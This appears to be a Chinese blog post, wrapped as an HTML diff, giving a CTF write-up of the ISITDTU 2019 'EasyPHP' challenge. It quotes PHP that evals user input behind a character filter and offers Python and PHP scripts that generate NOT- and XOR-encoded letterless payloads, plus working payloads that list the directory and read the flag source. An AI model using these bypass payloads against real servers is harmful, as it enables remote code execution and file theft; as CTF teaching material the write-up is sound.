@@ -1,0 +1,240 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>[ISITDTU 2019]EasyPHP - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[ISITDTU 2019]EasyPHP这里过滤了
+123456789101112&amp;lt;?phphighlight_file(__FILE__);$_ = @$_GET[&amp;#x27;_&amp;#x27,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">[ISITDTU 2019]EasyPHP</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">[ISITDTU 2019]EasyPHP</h1>
+        <div class="stuff">
+            <span>七月 11, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>这里过滤了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x00- 0-9                       匹配\x00到空格(\x20)，0-9的数字</span><br><span class="line">&#39;&quot;&#96;$&amp;.,|[&#123;_defgops              匹配这些字符</span><br><span class="line">\x7F                            匹配DEL(\x7F)字符</span><br></pre></td></tr></table></figure>
+
+<p>然后去php手册查了count_chars()函数</p>
+<p>返回由所有使用了的字节值组成的字符串</p>
+<p>并且长度不超过13</p>
+<p>这种无字母类型的命令执行之前就遇到过</p>
+<p>一般都会想到两种方法</p>
+<ul>
+<li>取反绕过</li>
+<li>异或绕过</li>
+</ul>
+<p>先说取反绕过，比较简单</p>
+<p>直接贴脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">$shell = urlencode(~$a);</span><br><span class="line">$info = <span class="string">&quot;(~&quot;</span>.$shell.<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $info;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后利用php7的特性构造(‘phpinfo’)();也可以调用函数</p>
+<p>所以payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p>想继续构造print_r(scandir(.))</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D)((~%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D)(~%D1));</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是太长了，无法执行，所以我们换做异或绕过试试</p>
+<ul>
+<li>异或绕过</li>
+</ul>
+<p>首先两个字符做异或计算,就是先把他们都转化为二进制，然后异或计算，最后得到二进制的结果转化为十进制再找对应的ascii码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   &#x3D;   1</span><br><span class="line">0   XOR   1   &#x3D;   1</span><br><span class="line">0   XOR   0   &#x3D;   0</span><br><span class="line">1   XOR   1   &#x3D;   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure>
+
+<p>从上面的例子我们可以看到，用符号?和~构造出了字母A，其他字符也是同理</p>
+<p>所以我们就可以利用这一特性构造无字母的命令执行</p>
+<p>贴上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r_xor</span>():</span></span><br><span class="line">    first=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    second=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    cmd = <span class="string">&quot;system&quot;</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">                result=i^j</span><br><span class="line">                <span class="comment">#print(&quot;  &quot;+chr(i)+&quot; ASCII:&quot;+str(i)+&#x27; &lt;--xor--&gt; &#x27;+chr(j)+&quot; ASCII:&quot;+str(j)+&#x27; == &#x27;+chr(result)+&quot; ASCII:&quot;+str(result))</span></span><br><span class="line">                <span class="keyword">if</span> (chr(result)==q):</span><br><span class="line">                    print(str(i)+<span class="string">&quot;     &quot;</span>+str(j)+<span class="string">&quot;      &quot;</span>+chr(result)) </span><br><span class="line">                    print(hex(int(i))+<span class="string">&quot;    &quot;</span>+hex(int(j))+<span class="string">&quot;     &quot;</span>+chr(result)) </span><br><span class="line">                    first+=hex(int(i))</span><br><span class="line">                    second+=hex(int(j))</span><br><span class="line">    ans = (<span class="string">&quot;((&quot;</span>+first+<span class="string">&quot;)^(&quot;</span>+second+<span class="string">&quot;))&quot;</span>)</span><br><span class="line">    payload = re.sub(<span class="string">r&#x27;0x&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,ans)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    r_xor()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>只需要在cmd输入需要执行的命令，就会自动输出异或后的结果，并且为了字符更少，第一个字符我都选择了%ff，一是让字符更少，二是增加可读性，我们用这种方法构造print_r(scandir(.))命令试一试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%ff%ff%ff%ff%ff%ff%ff)^(%8f%8d%96%91%8b%a0%8d))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%91%9b%96%8d))(%ff^%d1));</span><br></pre></td></tr></table></figure>
+
+<p>这就是构造的结果，但是依然反馈字符长度过长</p>
+<p>这里我们要再进行一次异或</p>
+<p>从已有的[0x8f,0x8d,0x96,0x91,0x8b,0xa0,0x8c,0x9c,0x9e,0x9b,0x96]11个字符中，选择出n个（这里是9个）进行异或计算后可以表示这11个字符</p>
+<p>贴出脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>]  <span class="comment"># 第一次抑或结果的字符16进制</span></span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># 不断删除，并且结果个数不变才可以继续删除</span></span><br><span class="line">temp = []</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        <span class="keyword">if</span> d <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里还没有做到自动化，还是需要手动拼接，以后来完善一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>
+
+<p>用这个语句读取当前目录的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; index.php [3] &#x3D;&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt ) </span><br></pre></td></tr></table></figure>
+
+<p>再用脚本构造一个下面命令的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(.)));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>
+
+<p>然后读出flag</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
